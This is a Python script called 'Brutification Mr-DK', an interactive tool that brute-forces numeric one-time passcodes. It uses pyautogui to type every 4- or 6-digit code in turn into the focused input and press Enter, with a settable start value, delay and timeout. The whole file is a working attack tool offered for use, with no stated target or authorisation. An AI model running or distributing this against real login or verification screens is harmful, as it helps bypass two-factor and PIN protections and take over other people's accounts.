#!/usr/bin/python

import time
import sys
import json
import os
import pyautogui

# File to store settings
SETTINGS_FILE = "bruteforce_settings.json"

# Default settings
default_settings = {
    "otp_length": 4,
    "start_range": 1001,
    "speed": 1.0,
    "timeout": 0  # 0 means no timeout
}

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            settings = json.load(f)
            # Ensure all default settings are present
            for key in default_settings:
                if key not in settings:
                    settings[key] = default_settings[key]
            return settings
    else:
        return default_settings.copy()

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f)

def display_menu(settings):
    print("\n--- Brutification Mr-DK ---")
    print(f"1. Start brute force ")
    print("2. Set OTP length (4 or 6)")
    print(f"3. Set starting range (current: {settings['start_range']})")
    print(f"4. Set entry speed (current: {settings['speed']} seconds)")
    print(f"5. Set timeout (current: {settings['timeout']} minutes)")
    print("6. Exit")
    choice = input("Enter your choice (1-6): ")

    if not choice.isdigit() or int(choice) not in range(1, 7):
        print("Invalid choice! Please enter a number between 1 and 6.")
        return display_menu(settings)
    
    return int(choice)

def set_otp_length(settings):
    length = input(f"Enter OTP length (4 or 6, current: {settings['otp_length']}): ")
    if length not in ['4', '6']:
        print("Invalid OTP length! Please enter 4 or 6.")
    else:
        settings['otp_length'] = int(length)
        save_settings(settings)

def set_starting_range(settings):
    start_range_input = input(f"Enter starting range for OTP (e.g., 1001, current: {settings['start_range']}): ")
    if not start_range_input.isdigit():
        print("Invalid starting range! Please enter a numeric value.")
    else:
        settings['start_range'] = int(start_range_input)
        save_settings(settings)

def set_speed(settings):
    speed_input = input(f"Enter delay between attempts in seconds (e.g., 0.5 for faster, 1 for normal, current: {settings['speed']}): ")
    try:
        speed = float(speed_input)
        if speed < 0:
            raise ValueError
        settings['speed'] = speed
        save_settings(settings)
    except ValueError:
        print("Invalid speed! Please enter a positive number.")

def set_timeout(settings):
    timeout_input = input(f"Enter timeout in minutes (0 for no timeout, current: {settings['timeout']}): ")
    try:
        timeout = int(timeout_input)
        if timeout < 0:
            raise ValueError
        settings['timeout'] = timeout
        save_settings(settings)
    except ValueError:
        print("Invalid timeout! Please enter a non-negative integer.")

def brute_force_otp(settings):
    print("Starting brute force in 5 seconds...")
    time.sleep(5)
    
    max_value = 10**settings['otp_length'] - 1  # e.g., 9999 for 4-digit, 999999 for 6-digit
    start_time = time.time()
    timeout_seconds = settings['timeout'] * 60
    
    for otp in range(settings['start_range'], max_value + 1):
        otp_str = str(otp).zfill(settings['otp_length'])  # Ensure the OTP has the correct length (e.g., 0001, 0023)
        
        # Use pyautogui to enter OTP and press Enter
        pyautogui.hotkey('ctrl', 'a')  # Select all text (if applicable)
        pyautogui.typewrite(otp_str)   # Type the OTP
        pyautogui.press('enter')       # Press Enter to submit

        print(f"Trying OTP: {otp_str}")

        time.sleep(settings['speed'])  # Delay between attempts based on user input
        
        # Check if the timeout has been reached
        if settings['timeout'] > 0 and (time.time() - start_time) >= timeout_seconds:
            print("Timeout reached. Stopping brute force.")
            break

def main():
    settings = load_settings()
    
    while True:
        choice = display_menu(settings)
        
        if choice == 1:
            brute_force_otp(settings)
        elif choice == 2:
            set_otp_length(settings)
        elif choice == 3:
            set_starting_range(settings)
        elif choice == 4:
            set_speed(settings)
        elif choice == 5:
            set_timeout(settings)
        elif choice == 6:
            sys.exit()
        else:
            print("Invalid option! Please select a valid option.")

if __name__ == "__main__":
    main()
